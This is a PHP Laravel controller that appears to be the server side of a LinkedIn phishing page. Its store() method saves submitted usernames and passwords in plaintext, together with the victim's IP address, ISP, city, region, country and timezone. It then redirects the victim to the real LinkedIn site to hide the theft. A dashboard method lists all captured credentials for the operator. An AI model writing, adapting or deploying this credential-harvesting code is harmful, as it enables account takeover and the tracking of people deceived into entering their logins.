<?php

namespace App\Http\Controllers\SocialNetwork;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use App\Models\Linkedin;

class LinkedinController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        /**
         * Get the ip address from the user
         */
        function getUserIpAddr(){
            if(!empty($_SERVER['HTTP_CLIENT_IP'])){
                //ip from share internet
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
                //ip pass from proxy
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            }else{
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            return $ip;
        }

        $getIpAddress = getUserIpAddr();
        return view('socialNetwork.linkedin.index', compact('getIpAddress'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $dataLinkedin = new Linkedin();

        $this->validate($request, [
            'username' => 'required',
            'password' => 'required',
        ]);

        $dataLinkedin->username = $request->username;
        $dataLinkedin->password = $request->password;
        $dataLinkedin->ip = $request->ip;
        $dataLinkedin->isp = $request->isp;
        $dataLinkedin->city = $request->city;
        $dataLinkedin->region = $request->region;
        $dataLinkedin->country = $request->country;
        $dataLinkedin->timezone = $request->timezone;
        
        $dataLinkedin->save();

        return redirect('https://linkedin.com/');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function dashboardLinkedin()
    {
        $dataLinkedin = Linkedin::orderBy('id', 'DESC')->paginate();
        //dd($dataLinkedin);
        return view('socialNetwork.linkedin.dashboard', compact('dataLinkedin'));
    }

}
